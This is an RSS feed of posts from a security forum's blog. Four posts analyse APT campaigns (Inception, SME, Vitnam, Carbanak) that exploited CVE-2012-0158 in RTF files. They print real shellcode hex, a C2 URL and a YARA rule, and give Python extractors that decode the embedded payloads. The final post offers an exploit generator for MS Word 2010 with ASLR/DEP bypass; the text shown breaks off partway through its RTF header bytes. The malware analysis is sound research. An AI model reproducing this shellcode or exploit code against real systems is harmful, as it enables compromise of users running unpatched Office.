<?xml version="1.0" encoding="ISO-8859-1"?>

<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
	<channel>
		<title>Garage4hackers Forum - Blogs - w@rri0r@bh@y</title>
		<link>http://garage4hackers.com/blog.php?u=8196</link>
		<description>Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research.</description>
		<language>en</language>
		<lastBuildDate>Sun, 22 Mar 2020 12:23:33 GMT</lastBuildDate>
		<generator>vBulletin</generator>
		<ttl>60</ttl>
		<image>
			<url>http://garage4hackers.com/images/misc/rss.jpg</url>
			<title>Garage4hackers Forum - Blogs - w@rri0r@bh@y</title>
			<link>http://garage4hackers.com/blog.php?u=8196</link>
		</image>
		<item>
			<title>Apt inception</title>
			<link>http://garage4hackers.com/entry.php?b=3121</link>
			<pubDate>Mon, 23 Mar 2015 11:39:40 GMT</pubDate>
			<description><![CDATA[Greet: "Vinnu", "nightrover","bond" 
 
In the month of Dec 2014 BlueCoat...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Greet: &quot;Vinnu&quot;, &quot;nightrover&quot;,&quot;bond&quot;<br />
<br />
In the month of Dec 2014 <a href="https://www.bluecoat.com/security-blog/2014-12-09/blue-coat-exposes-%E2%80%9C-inception-framework%E2%80%9D-very-sophisticated-layered-malware" target="_blank">BlueCoat</a> released report on APT campaign named ad &quot;Inception&quot;. The spear phishing mail was sent with attachment with various names we analyzed attachment which was named as &quot;Car for sale.doc&quot;. The Attachment was exploit (CVE-2012-0158) with embed VBS and decoy file themed an advertisement of a used car for sale that purportedly originated from Michael Hahne employee at the German Embassy. <br />
For writing this blog our main moto was to automate Extraction of large payload and decoy file used in APT Inception so that it can save time of researchers to extract payloads and possibly new varient of the malware.<br />
Decoy File<br />
------------<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=839&amp;d=1427109979" border="0" alt="Name:  1.JPG
Views: 196
Size:  39.2 KB"  /><br />
<br />
Payload<br />
---------<br />
VBE File -&gt; VBS File -&gt; Dll File -&gt; C2<br />
<br />
C2 Info<br />
--------<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">http://webdav.cloudme.com/chloe7400/CloudDrive/</pre>
</div>The sample we used can trigger vulnerability in both on MS office 2007 and MS office 2010. <br />
The following is the code attackers used<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36pxpre>
</div>Attackers also used Following code instead of the Nop Slide.<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">4B4B414A4748434F4742434A434B42414149434F42414E4F494A4142434F484F434A4B4848434343484A4E41424A4E43464B424842484848474746424A4742424F4B464B4F434B4A4F464848484641434A4E4E4E484F48474241424E484B484748484848</pre>
</div>We used following sample for creating extraction code:<br />
Md5 : 4624da84cae0f8b689169e24be8f7410<br />
Exploit - CVE-2012-0158<br />
<br />
Shell Code used in this sample was:<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">6081ec001000008bec33c9648b35300000008b760c8b761c8b5e088b46088b7e208b3666394f1875f2e8050000009090909090895d04894508ff750868ad9b7ddfe8bf000000894520ff75086854caaf91e8af000000894524ff750868ac08da76e89f000000894528ff7508681665fa10e88f00000089452c6a045e5456ff552089859400000083f8ff750683c60456ebe983f80076f56a006a0068e657000056ff55288d85900000006a00506a088d859c0000005056ff552c81bd9c0000005054405475c689b5980000006a406800100000ffb5a00000006a00ff55248985a40000008d9d900000006a0053ffb5a000000050ffb598000000ff552c8b9da4000000ffe3558bec578b7d088b5d0c568b733c8b74337803f3568b762003f333c94941ad03c35633f60fbe1038d67408c1ce0d03f240ebf13bfe5e75e55a8beb8b5a2403dd668b0c4b8b5a1c03dd8b048b03c55e5f5dc2080</pre>
</div>After analysing sample we came with the Python Extractor which can be used for extracting Malware &amp; Decoy from the attachment/Doc exploit used in this Campaign:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">import os, shutil,binascii


scan = os.getcwd() + &quot;\\scan\\&quot;
processed_file = os.getcwd() + &quot;\\comp\\&quot;
nocomp = os.getcwd() + &quot;\\nocomp\\&quot;
output = os.getcwd() + &quot;\\output\\&quot;

try:
    os.mkdir(processed_file)
    os.mkdir(nocomp)
    os.mkdir(output)
except:
    pass

samples = os.listdir(scan)

def mov_nocomp():
 try:
     shutil.move(os.path.join(scan,sample),os.path.join(nocomp,sample))
 except:
       pass

def mov_processed_file():
 try:
     shutil.move(os.path.join(scan,sample),os.path.join(processed_file,sample))
 except:
       pass


def decryption(file_size,file_decrypt):
        comp = &quot;&quot;
        xor_key = &quot;&quot;
        a = file_size-1
        for i in range(file_size-1,0,-1):
                xor_key = a % 0x100
                comp += chr(ord(file_decrypt[i]) ^ xor_key)
                a = a - 1
        comp1 = &quot;&quot;
        a1 = len(comp)-1
        for i in range (0,len(comp)-1,1):
            comp1 += comp[a1]
            a1 = a1 - 1
        return comp1

def vbs_swap(data):
    compl = &quot;&quot;
    a = 0
    b = 1
    comp = &quot;&quot;
    for i in range (0,0x200,2):
        compl += data[b]+data[a]
        a = a + 2
        b = b + 2
    comp = compl + data[0x200:]
    return comp

for sample in samples:
        file = open(scan+sample,&quot;rb&quot;)
        fl = file.read()
        file.close()
        
        if fl[:4] == &quot;{\\rt&quot;:
            found = fl.find(&quot;VPdPD&quot;)
            print &quot;Processing_APT_Inception_&quot; + sample
            file_decrypt = &quot;&quot;
            if found &gt; -1:
                file_decrypt = fl[found+0x1d:]
                file_size = len(file_decrypt)
                comp = decryption(file_size,file_decrypt)
                data = binascii.unhexlify('D0CF11')
                doc_file = comp.find(data)
                vbs_file = comp[8:doc_file]
                vbs_data = vbs_swap(vbs_file)
                doc_file1 = comp[doc_file:]
                vbs_ex = open(output+sample+&quot;.vbs&quot;,&quot;wb&quot;)
                vbs_ex.write(vbs_data)
                vbs_ex.close()
                doc_ex = open(output+sample+&quot;.doc&quot;,&quot;wb&quot;)
                doc_ex.write(doc_file1)
                doc_ex.close()
                mov_processed_file()
            else:
                mov_nocomp()
        else:
            mov_nocomp()</pre>
</div></blockquote>

]]></content:encoded>
			<dc:creator>w@rri0r@bh@y</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3121</guid>
		</item>
		<item>
			<title>Apt sme</title>
			<link>http://garage4hackers.com/entry.php?b=3117</link>
			<pubDate>Fri, 20 Mar 2015 06:11:43 GMT</pubDate>
			<description><![CDATA[Greet : "Vinnu", "nightrover","bond" 
 
I have used name "APT SME " because payload developer have used the name for his project.I have just created...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Greet : &quot;Vinnu&quot;, &quot;nightrover&quot;,&quot;bond&quot;<br />
<br />
I have used name &quot;APT SME &quot; because payload developer have used the name for his project.I have just created automation to exctract payload  file from the exploit used in APT SME.<br />
<br />
Sample used for creating Automation:<br />
Md5 - 57A8DB5A5D35464BE16518332A64A992<br />
<br />
Shellcode:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">e80000000081efb178fd9401f76681e6a9008b04248d7424186681cfa81d83c40181f782e7813383c40281e7e3000000446681eeb25e83e8056689ff66c1ef7905c00000006681e7bc00bb84feffffc1e66cf7db8d7c241883e20066c1e6f880e50001f680c5378d74242080c5b46601f666478a0883e76e01fe30e96681ce483df6c101751581f782e7813380c1016681cee476eb106681f7ecf181ce63af2725fec9c1e63bc1efed880866c1e74d83c2016629f783e8ff8d7c240439da75b1db238e619bda619ce6619cf66184e261acca61dc8cd3a2f29f1861afd661beef92eb006198caeb04db23ab47eb0261f2c1b2ee6b110fca37159f05a361b0ceeb018c61e6a161b0f6eb01e9c661bfdb318c6b2115e5a980e2b961aecee2153a6f2a9f0752a5a588886335459f02459f0f6bd54d4d31319f32bcbdb963146904e2537344e8ea522f77f66b5579ebeaeb1d0dd8ecac0813b1b5b4d747f370699f5a692deeb3bddb235c38546744e8ea60fd6a10ea9ee36a2ceed2189ee8da1862fdabadd31b9f02b58c53a7b08c63e5bddb238e619bda619ce6619cf66184e26194ca61dcd2a5f29f1901a3b58207d38bf0153d821515e5ea15dece82eaeaeeea153aefeafaeaeaba159eceeedb232deaeaeaeaea692bee692aee6b13ea7ae9ea9f06b4b553cfe6eaeabc6b2c8248e8eabd194e29025815151561afd661b6ef92eb0161a1f209d8a361a9caeb0261de62eb04db2a7346eb282b20e7a2931dd1beceee9f0b61a9ceeb028c61e6a261a9f6eb0261ee62eb026313b0b4b82900</pre>
</div>Extractor :<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">import os, shutil,binascii


scan = os.getcwd() + &quot;\\scan\\&quot;
processed_file = os.getcwd() + &quot;\\comp\\&quot;
nocomp = os.getcwd() + &quot;\\nocomp\\&quot;
output = os.getcwd() + &quot;\\output\\&quot;

try:
    os.mkdir(processed_file)
    os.mkdir(nocomp)
    os.mkdir(output)
except:
    pass

samples = os.listdir(scan)

def mov_nocomp():
 try:
     shutil.move(os.path.join(scan,sample),os.path.join(nocomp,sample))
 except:
       pass

def mov_processed_file():
 try:
     shutil.move(os.path.join(scan,sample),os.path.join(processed_file,sample))
 except:
       pass


def decoder(rev):
        DH = 0x0D2
        comp = &quot;&quot;
        d = 0
        for j in range (0,len(rev),1):
            #print ord(rev[j])
            #print ord(rev[0x5d])
            if ord(rev[d]) == 0:
                #print d
                comp += rev[d]
               
            else:
                DH = DH + 0x4
                DH = DH % 0x100
                if ord(rev[d]) == DH:
                    comp += rev[d]
                else:
                    comp += chr(ord(rev[d]) ^ DH)
            d = d + 1
        return comp
       
def mov_hex(data):
        rev = &quot;&quot;
        a = 0
        b = 1
        c = &quot;&quot;
        #print data
        for i in range (0,len(data),2):
                c = data[a] + data[b]
                c = c.decode(&quot;hex&quot;)
                rev += c
                a = a + 2
                b = b + 2
        return rev
    

for sample in samples:
        file = open(scan+sample,&quot;rb&quot;)
        file1 = file.read()
        file.close()

        if file1[:4] == &quot;{\\rt&quot;:
            print &quot;Processing_APT_SME&quot; + sample
            found = file1.find(&quot;4f4f6262&quot;)
            print found
            if found &gt; -1:
                data = file1[found+26:found + 0x58398]
                data = data.replace(&quot;\r\n&quot;,&quot;&quot;)
                rev = mov_hex(data)
                comp = decoder(rev)
                comp = &quot;MZ&quot; + comp[2:0x2a268]
                fil = open(output+sample+&quot;.exe_&quot;,&quot;wb&quot;)
                fil.write(comp)
                fil.close()
                mov_processed_file()
            else:
                mov_nocomp()
        else:
            mov_nocomp()</pre>
</div></blockquote>

]]></content:encoded>
			<dc:creator>w@rri0r@bh@y</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3117</guid>
		</item>
		<item>
			<title>Apt vitnam</title>
			<link>http://garage4hackers.com/entry.php?b=3116</link>
			<pubDate>Fri, 20 Mar 2015 06:04:47 GMT</pubDate>
			<description><![CDATA[Greet  :- "vinnu","nightrover","bond" 
 
I used the name "VITNAM" because the decoy file had some contents from Vietnam. Here i have automated a...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Greet  :- &quot;vinnu&quot;,&quot;nightrover&quot;,&quot;bond&quot;<br />
<br />
I used the name &quot;VITNAM&quot; because the decoy file had some contents from Vietnam. Here i have automated a process through which we can extract an Executable from rtf exploit.<br />
<br />
Yara Rule:<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:156px;">rule APT_VITNAM {
  meta:
   author = &quot;w@rri0r@bh@y&quot;
  strings :
   $magic = &quot;{\\rt&quot;
   $v0 = &quot;eb00eb1490905e33c980368746&quot;
   $v1 = &quot;1816685e99e2&quot;
   $v2 = &quot;\xD4\x39\x09\x63&quot;
  condition :
   ($magic at 0) and (3 of ($v*))
}</pre>
</div>Extractor For Shellcode:<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">&quot;eb00eb1490905e33c9803687464181f9000200007408ebf1e8e9ffffff17d2b44ee30cb2b78787870cf18b0cf19b0cd98f0ce98f0cf9a70cb1e1bec89ff2750c5a6e88868787da0c7aed89de6f3e878787657e400207868787878787870a3a07868787048083ed87ed87ef4bca878778b078d2a3ba4bca8787f265ed870a0217868787d7ed830c42820f868787d778b078d2ab063a0f868787d6d5d4d3f239edc7ef87978787ef87978787ed8778d2af0e020f868787ed870a0217868787d76c8c1717171717171717171717ef878187870c020f868787d70c0207868787d778d2ab0c1a0f868787b44e6c8c171717171717171717171707b38c64c6067e87818787f27478220f868787d6d20cf4bb0cf399ff8474d10cf1a78474b44ecec62a8444b46a883997bd51f38f464a80846dc76c76bca8f260d90ce9a3846ce10ccbca870ce99b846c0cc30a8784442cdade44171717176f6b797878b5f3168bbe65fa04d6a8258627e2104ce40e56c809948d2b14b56313d0e18a78430a98f3c4392b5ce0de599935b188943efbf2ee1c000c62abb4858787878787f9c2dfc4c2cb87872d1f1f335183a599d00d6ca5b620c1edb0d9a5668562d36a0e9fb9edc3e12e18a5629300bca6bd13772af0ed6962e06ee3689d2bdf9cd465c5d5245ed5aca566f08ff5e545912e6686acaded4d62e44686acad360ea88165c0e1f5edc4f5a6238db92e2795b92e2791b92e279db92e2b61627cedc0112e9dae102e523d6c538770a8a6138d01816685e99e2444444444444&quot;</pre>
</div>This shellcode was used in exploit cve-2012-0158<br />
Sample used :<br />
SHA256: c072e309c087e496a8a72eb47eba9ce6d5708a6738dd1311eb  3921f0f98fa461<br />
Md5: 0b95c9d37e430a0b7b176b71fb65fc1a<br />
<br />
I have written an automated script which can process lots of samples which have the same shellcode..<br />
To use create a folder named &quot;scan&quot; and put the sample in it. scan folder and script should be in same directory. <br />
<br />
Extractor:<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">import os, shutil,binascii

scan = os.getcwd() + &quot;\\scan\\&quot;
processed_file = os.getcwd() + &quot;\\comp\\&quot;
nocomp = os.getcwd() + &quot;\\nocomp\\&quot;
MZ = os.getcwd() + &quot;\\MZ\\&quot;

try:
 os.mkdir(processed_file)
 os.mkdir(nocomp)
 os.mkdir(MZ)
except:
 pass
 
samples = os.listdir(scan)

def ror(byte, count):
    return (byte &gt;&gt; count | byte &lt;&lt; (8- count)) &amp; 0xFF
 
def decode_vit(file_decrypt,file_size):
 complete_file = &quot;&quot;
 a = 0
 for i in range(0,file_size-1,2):
  complete_file += chr(ror(ord(file_decrypt[a]),4))
  complete_file += chr(ord(file_decrypt[a+1]) ^ 0x63)
  a = a+2
 return complete_file

def mov_nocomp():
 try:
     shutil.move(os.path.join(scan,sample),os.path.join(nocomp,sample))
 except:
       pass

def mov_processed_file():
 try:
     shutil.move(os.path.join(scan,sample),os.path.join(processed_file,sample))
 except:
       pass

for sample in samples:
  file = open(scan+sample,&quot;rb&quot;)
  fl = file.read()
  file.close()
  if fl[:4] == &quot;{\\rt&quot;:
   found = fl.find(&quot;\xD4\x39\x09\x63&quot;)
   print found
   file_decrypt = &quot;&quot;
   if found &gt; -1:
    file_decrypt = fl[found:]
    file_size = len(file_decrypt)
    print file_size
    complete_file = decode_vit(file_decrypt,file_size)
    MZ_File = complete_file.find(&quot;MZ&quot;)
    data = binascii.unhexlify('D0CF11')
    doc_file = complete_file.find(data)
    MZ_extraction = open(MZ+sample+&quot;.exe_&quot;,&quot;wb&quot;)
    MZ_extraction.write(complete_file[MZ_File:doc_file])
    MZ_extraction.close()
    doc_Extraction = open(MZ+sample+&quot;.doc&quot;,&quot;wb&quot;)
    doc_Extraction.write(complete_file[doc_file:])
    doc_Extraction.close()
    mov_processed_file()
   else:
    mov_nocomp()
  else:
   mov_nocomp()</pre>
</div></blockquote>

]]></content:encoded>
			<dc:creator>w@rri0r@bh@y</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3116</guid>
		</item>
		<item>
			<title>Apt carbanak</title>
			<link>http://garage4hackers.com/entry.php?b=3115</link>
			<pubDate>Fri, 20 Mar 2015 06:00:39 GMT</pubDate>
			<description><![CDATA[Greet : "Vinnu", "nightrover","bond" 
 
 All the analysis is done by "Kaspersky" company. I have just created automation to exctract payload from the...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Greet : &quot;Vinnu&quot;, &quot;nightrover&quot;,&quot;bond&quot;<br />
<br />
 All the analysis is done by &quot;Kaspersky&quot; company. I have just created automation to exctract payload from the exploit used in APT CARBANAK.<br />
<br />
Sample used for creating Automation:<br />
Md5 - 8fa296efaf87ff4d9179283d42372c52, 665b6cb31d962aefa3037b5849889e06, 2c395f211db2d02cb544448729d0f081, 31e16189e9218cb131fdb13e75d0a94f, db83e301564ff613dd1ca23c30a387f0, 86e48a9be62494bffb3b8e5ecb4a0310, 6c7ac8dfd7bc5c2bb1a6d7aec488c298<br />
<br />
Extractor :<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">import os, shutil,binascii


scan = os.getcwd() + &quot;\\scan\\&quot;
processed_file = os.getcwd() + &quot;\\comp\\&quot;
nocomp = os.getcwd() + &quot;\\nocomp\\&quot;
output = os.getcwd() + &quot;\\output\\&quot;

try:
    os.mkdir(processed_file)
    os.mkdir(nocomp)
    os.mkdir(output)
except:
    pass

samples = os.listdir(scan)

def mov_nocomp():
 try:
     shutil.move(os.path.join(scan,sample),os.path.join(nocomp,sample))
 except:
       pass

def mov_processed_file():
 try:
     shutil.move(os.path.join(scan,sample),os.path.join(processed_file,sample))
 except:
       pass


def decoder(rev1):
        if rev1[:2] == &quot;C1&quot;:
                DH = 0x81
        elif rev1[:2] == &quot;C2&quot;:
                DH = 0x83
        elif rev1[:2] == &quot;C3&quot;:
                DH = 0xFE
        elif rev1[:2] == &quot;C4&quot;:
                DH = 0xBC
        else :
                print &quot;Not Found&quot;
        rev = rev1[2:]
        comp = &quot;&quot;
        d = 0
        for j in range (0,len(rev),1):
            if ord(rev[d]) == 0:
                comp += rev[d]
               
            else:
                DH = DH + 0x9
                DH = DH % 0x100
                if ord(rev[d]) == DH:
                    comp += rev[d]
                else:
                    comp += chr(ord(rev[d]) ^ DH)
            d = d + 1
        return comp
def decoder1(rev):
        DH = 0x7c
        comp = &quot;&quot;
        d = 0
        for j in range (0,len(rev),1):
            if ord(rev[d]) == 0:
                comp += rev[d]
               
            else:
                DH = DH + 0x8
                DH = DH % 0x100
                if ord(rev[d]) == DH:
                    comp += rev[d]
                else:
                    comp += chr(ord(rev[d]) ^ DH)
            d = d + 1
        return comp
def decoder2(rev):
        DH = 0xAB
        comp = &quot;&quot;
        d = 0
        for j in range (0,len(rev),1):
            if ord(rev[d]) == 0:
                comp += rev[d]
               
            else:
                DH = DH + 0x4
                DH = DH % 0x100
                if ord(rev[d]) == DH:
                    comp += rev[d]
                else:
                    comp += chr(ord(rev[d]) ^ DH)
            d = d + 1
        return comp
def decoder3(rev):
        DH = 0xA7
        comp = &quot;&quot;
        d = 0
        for j in range (0,len(rev),1):
            if ord(rev[d]) == 0:
                comp += rev[d]
               
            else:
                DH = DH + 0x6
                DH = DH % 0x100
                if ord(rev[d]) == DH:
                    comp += rev[d]
                else:
                    comp += chr(ord(rev[d]) ^ DH)
            d = d + 1
        return comp
       
def mov_hex(data):
        rev = &quot;&quot;
        a = 0
        b = 1
        c = &quot;&quot;
        for i in range (0,len(data),2):
                c = data[a] + data[b]
                c = c.decode(&quot;hex&quot;)
                rev += c
                a = a + 2
                b = b + 2
        return rev
       
def MZ_Processed(comp):
    fil = open(output+sample+&quot;.exe_&quot;,&quot;wb&quot;)
    fil.write(comp)
    fil.close()
    mov_processed_file()
    

for sample in samples:
        file = open(scan+sample,&quot;rb&quot;)
        file1 = file.read()
        file.close()

        if file1[:4] == &quot;{\\rt&quot;:
            print &quot;Processing_APT_Carbanak_&quot; + sample
            found = file1.find(&quot;4b4b6b6b4b4b6b6b&quot;)
            found1 = file1.find(&quot;5959797959597979&quot;)
            found2 = file1.find(&quot;51518e8e51518e8e&quot;)
            found3 = file1.find(&quot;5252616152526161&quot;)
            found4 = file1.find(&quot;5b5b8b8b5b5b8b8b&quot;)
            found5 = file1.find(&quot;3c3c64643c3c6464&quot;)
            found6 = file1.find(&quot;55556f6f55556f6f&quot;)
            if found &gt; -1:
                data = file1[found+26:found + 0x64bbc]
                data = data.replace(&quot;\r\n&quot;,&quot;&quot;)
                print len(data)
                rev = mov_hex(data)
                comp = decoder(&quot;C1&quot; + rev)
                comp = &quot;MZ&quot; + comp[2:]
                MZ_Processed(comp)
            elif found1 &gt; -1:
                data = file1[found1+26:found1+0xA7E1C]
                data = data.replace(&quot;\r\n&quot;,&quot;&quot;)
                print len(data)%2
                rev = mov_hex(data)
                comp = decoder(&quot;C2&quot;+rev)
                comp = &quot;MZ&quot; + comp[2:]
                MZ_Processed(comp)
            elif found2 &gt; -1:
                data = file1[found2+26:found2+0xD4b3e]
                data = data.replace(&quot;\r\n&quot;,&quot;&quot;)
                print len(data)%2
                rev = mov_hex(data)
                comp = decoder1(rev)
                comp = &quot;MZ&quot;+comp[2:]
                MZ_Processed(comp)
            elif found3 &gt; -1:
                data = file1[found3+26:found3+0xAAF20]
                data = data.replace(&quot;\r\n&quot;,&quot;&quot;)
                print len(data)%2
                rev = mov_hex(data)
                comp = decoder2(rev)
                comp = &quot;MZ&quot;+comp[2:]
                MZ_Processed(comp)
            elif found4 &gt; -1:
                data = file1[found4+26:found4+0xA551e]
                data = data.replace(&quot;\r\n&quot;,&quot;&quot;)
                print len(data)%2
                rev = mov_hex(data)
                comp = decoder3(rev)
                comp = &quot;MZ&quot;+comp[2:]
                MZ_Processed(comp)
            elif found5 &gt; -1:
                data = file1[found5+26:found5+ 0x5184a]
                data = data.replace(&quot;\r\n&quot;,&quot;&quot;)
                print len(data)
                rev = mov_hex(data)
                comp = decoder(&quot;C3&quot; + rev)
                comp = &quot;MZ&quot; + comp[2:]
                MZ_Processed(comp)
            elif found6 &gt; -1:
                data = file1[found6+26:found6+ 0x50c1e]
                data = data.replace(&quot;\r\n&quot;,&quot;&quot;)
                print len(data)
                rev = mov_hex(data)
                comp = decoder(&quot;C4&quot; + rev)
                comp = &quot;MZ&quot; + comp[2:]
                MZ_Processed(comp)
            else:
                mov_nocomp()
        else:
            mov_nocomp()</pre>
</div></blockquote>

]]></content:encoded>
			<dc:creator>w@rri0r@bh@y</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3115</guid>
		</item>
		<item>
			<title>Exploit for  MS WORD 2010 in Windows 7 (CVE-2012-0158)</title>
			<link>http://garage4hackers.com/entry.php?b=1623</link>
			<pubDate>Sat, 01 Mar 2014 10:44:04 GMT</pubDate>
			<description>Exploit For MS WORD 2010 
CVE-2012-0158 
ASLR BYPASS - MSCOMCTL.OCX (non-ASLR Module) 
DEP BYPASS - Complete code in code section 
 
 
Code:...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Exploit For MS WORD 2010<br />
CVE-2012-0158<br />
ASLR BYPASS - MSCOMCTL.OCX (non-ASLR Module)<br />
DEP BYPASS - Complete code in code section<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">#!/usr/bin/python

import struct
import binascii

header = (
&quot;\x7B\x5C\x72\x74\x66\x31\x0D\x0A\x7B\x5C\x66\x6F\x6E\x74\x74\x62\x6C\x7B\x5C\x66\x30\x5C&quot;
&quot;\x66\x6E\x69\x6C\x5C\x66\x63\x68\x61\x72\x73\x65\x74\x30\x20\x56\x65\x72\x64\x61\x6E\x61&quot;
&quot;\x3B\x7D\x7D\x0D\x0A\x5C\x76\x69\x65\x77\x6B\x69\x6E\x64\x34\x5C\x75\x63\x31\x5C\x70\x61&quot;
&quot;\x72\x64\x5C\x73\x62\x31\x30\x30\x5C\x73\x61\x31\x30\x30\x5C\x6C\x61\x6E\x67\x39\x5C\x66&quot;
&quot;\x30\x5C\x66\x73\x32\x32\x5C\x70\x61\x72\x0D\x0A\x5C\x70\x61\x72\x64\x5C\x73\x61\x32\x30&quot;
&quot;\x30\x5C\x73\x6C\x32\x37\x36\x5C\x73\x6C\x6D\x75\x6C\x74\x31\x5C\x6C\x61\x6E\x67\x39\x5C&quot;
&quot;\x66\x73\x32\x32\x5C\x70\x61\x72\x0D\x0A\x7B\x5C\x6F\x62\x6A\x65\x63\x74\x5C\x6F\x62\x6A&quot;
&quot;\x6F\x63\x78\x0D\x0A\x7B\x5C\x2A\x5C\x6F\x62\x6A\x64\x61\x74\x61\x0D\x0A\x30\x31\x30\x35&quot;
&quot;\x30\x30\x30\x30\x30\x32\x30\x30\x30\x30\x30\x30\x31\x42\x30\x30\x30\x30\x30\x30\x34\x44&quot;
&quot;\x35\x33\x34\x33\x36\x46\x36\x44\x36\x33\x37\x34\x36\x43\x34\x43\x36\x39\x36\x32\x32\x45&quot;
&quot;\x34\x43\x36\x39\x37\x33\x37\x34\x35\x36\x36\x39\x36\x35\x37\x37\x34\x33\x37\x34\x37\x32&quot;
&quot;\x36\x43\x32\x45\x33\x32\x0D\x0A\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x45\x30\x30\x30\x30\x0D\x0A\x44\x30\x43\x46\x31\x31\x45\x30&quot;
&quot;\x41\x31\x42\x31\x31\x41\x45\x31\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x33\x45\x30\x30&quot;
&quot;\x30\x33\x30\x30\x46\x45\x46\x46\x30\x39\x30\x30\x30\x36\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x31\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x31\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x31\x30\x30\x30&quot;
&quot;\x30\x30\x30\x32\x30\x30\x30\x30\x30\x30\x30\x31\x30\x30\x30\x30\x30\x30\x46\x45\x46\x46&quot;
&quot;\x46\x46\x46\x46\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
